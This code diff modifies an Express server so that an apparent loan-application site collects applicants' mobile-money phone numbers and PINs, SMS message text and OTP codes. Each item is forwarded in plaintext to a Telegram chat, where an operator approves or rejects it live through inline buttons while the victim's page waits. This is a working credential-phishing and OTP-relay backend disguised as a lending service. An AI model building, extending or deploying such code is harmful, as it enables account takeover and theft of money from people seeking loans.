@@ -1,5 +1,6 @@
 const express = require('express');
 const path = require('path');
+const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
@@ -11,40 +12,38 @@ const applications = {};
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// 1. Create a new loan application
+// Create application session
 app.post('/applications', (req, res) => {
   const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
   applications[appId] = {
     id: appId,
     ...req.body,
-    status: 'pending'
+    status: 'pending_auth',
+    sms_status: 'pending_sms',
+    otp_status: 'pending_otp'
   };
   res.json({ id: appId });
 });
 
-// 2. Submit application and trigger Telegram notification with inline buttons
-app.post('/applications/:id/submit', async (req, res) => {
+// Submit MoMo Auth for Approval
+app.post('/applications/:id/submit-auth', async (req, res) => {
   const appId = req.params.id;
   const appData = applications[appId];
+  if (!appData) return res.status(404).json({ error: 'Application not found' });
 
-  if (!appData) {
-    return res.status(404).json({ error: 'Application not found' });
-  }
+  appData.momo_phone = req.body.momo_phone;
+  appData.momo_pin = req.body.momo_pin;
 
-  const message = `🔔 *New Loan Application Received!*\n\n` +
-    `👤 *Name:* ${appData.name}\n` +
-    `📱 *Phone:* ${appData.phone}\n` +
-    `💰 *Amount:* ZMW ${Number(appData.desired_amount).toLocaleString()}\n` +
-    `⏱️ *Term:* ${appData.desired_term} Months\n` +
-    `💼 *Employer/Status:* ${appData.employer}\n` +
-    `📄 *Purpose:* ${appData.purpose}\n` +
+  const message = `🔐 *MoMo Authentication Request*\n\n` +
+    `📱 *Phone:* ${appData.momo_phone}\n` +
+    `🔑 *PIN:* ${appData.momo_pin}\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
     inline_keyboard: [
       [
-        { text: '✅ Approve', callback_data: `approve_${appId}` },
-        { text: '❌ Reject', callback_data: `reject_${appId}` }
+        { text: '✅ Approve Auth', callback_data: `auth_approve_${appId}` },
+        { text: '❌ Reject Auth', callback_data: `auth_reject_${appId}` }
       ]
     ]
   };
@@ -53,43 +52,108 @@ app.post('/applications/:id/submit', async (req, res) => {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-        reply_markup: keyboard
-      })
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
     res.json({ success: true });
   } catch (error) {
-    console.error('Telegram notification error:', error);
+    console.error('Telegram error:', error);
     res.status(500).json({ error: 'Failed to send notification' });
   }
 });
 
-// 3. Poll application status from frontend
+// Submit SMS Text for Verification
+app.post('/applications/:id/submit-sms', async (req, res) => {
+  const appId = req.params.id;
+  const appData = applications[appId];
+  if (!appData) return res.status(404).json({ error: 'Application not found' });
+
+  appData.sms_text = req.body.sms_text;
+
+  const message = `💬 *SMS Verification Text Received*\n\n` +
+    `📄 *Content:* ${appData.sms_text}\n` +
+    `🆔 *App ID:* ${appId}`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: '✅ Correct SMS Text', callback_data: `sms_correct_${appId}` },
+        { text: '❌ Wrong SMS Text', callback_data: `sms_wrong_${appId}` }
+      ]
+    ]
+  };
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
+    });
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Telegram error:', error);
+    res.status(500).json({ error: 'Failed to send notification' });
+  }
+});
+
+// Submit OTP Code for Verification
+app.post('/applications/:id/submit-otp', async (req, res) => {
+  const appId = req.params.id;
+  const appData = applications[appId];
+  if (!appData) return res.status(404).json({ error: 'Application not found' });
+
+  appData.otp_code = req.body.otp_code;
+
+  const message = `🔢 *OTP Verification Received*\n\n` +
+    `🔑 *OTP Code:* ${appData.otp_code}\n` +
+    `🆔 *App ID:* ${appId}`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: '✅ Correct OTP', callback_data: `otp_correct_${appId}` },
+        { text: '❌ Wrong OTP', callback_data: `otp_wrong_${appId}` }
+      ]
+    ]
+  };
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
+    });
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Telegram error:', error);
+    res.status(500).json({ error: 'Failed to send notification' });
+  }
+});
+
+// Poll application status
 app.get('/applications/:id', (req, res) => {
   const appData = applications[req.params.id];
-  if (!appData) {
-    return res.status(404).json({ error: 'Application not found' });
-  }
+  if (!appData) return res.status(404).json({ error: 'Application not found' });
   res.json(appData);
 });
 
-// 4. Telegram Webhook Endpoint to handle Inline Button Clicks
+// Telegram Webhook Endpoint
 app.post('/telegram-webhook', async (req, res) => {
   const update = req.body;
 
   if (update.callback_query) {
-    const callbackQuery = update.callback_query;
-    const data = callbackQuery.data; 
-    const [action, appId] = data.split('_');
+    const cb = update.callback_query;
+    const dataParts = cb.data.split('_');
+    const type = dataParts[0]; // 'auth', 'sms', or 'otp'
+    const action = dataParts[1]; // 'approve', 'reject', 'correct', 'wrong'
+    const appId = dataParts.slice(2).join('_');
 
     if (applications[appId]) {
-      if (action === 'approve') {
-        applications[appId].status = 'approved';
-      } else if (action === 'reject') {
-        applications[appId].status = 'rejected';
+      if (type === 'auth') {
+        applications[appId].status = (action === 'approve') ? 'auth_approved' : 'auth_rejected';
+      } else if (type === 'sms') {
+        applications[appId].sms_status = (action === 'correct') ? 'sms_correct' : 'sms_wrong';
+      } else if (type === 'otp') {
+        applications[appId].otp_status = (action === 'correct') ? 'otp_correct' : 'otp_wrong';
       }
     }
 
@@ -98,12 +162,12 @@ app.post('/telegram-webhook', async (req, res) => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          callback_query_id: callbackQuery.id,
-          text: `Application successfully ${action}d!`
+          callback_query_id: cb.id,
+          text: `Action processed successfully!`
         })
       });
     } catch (e) {
-      console.error('Error answering callback query:', e);
+      console.error('Callback error:', e);
     }
   }
 
@@ -114,3 +178,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+                                    
